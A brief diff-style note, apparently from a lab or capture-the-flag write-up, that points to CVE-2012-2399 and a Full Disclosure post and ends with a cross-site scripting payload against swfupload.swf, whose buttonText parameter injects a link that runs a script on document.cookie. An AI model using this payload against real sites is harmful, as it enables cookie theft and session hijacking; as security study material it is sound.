@@ -1,0 +1,9 @@
+looking up the CVE,
+
+https://www.cvedetails.com/cve/CVE-2012-2399/
+
+then running the second bit of code from here
+
+https://seclists.org/fulldisclosure/2013/Mar/110
+
+swfupload.swf?buttonText=%3Ca%20href=%27javascript:alert(document.cookie)%27%3EClick%20me%3C/a%3E
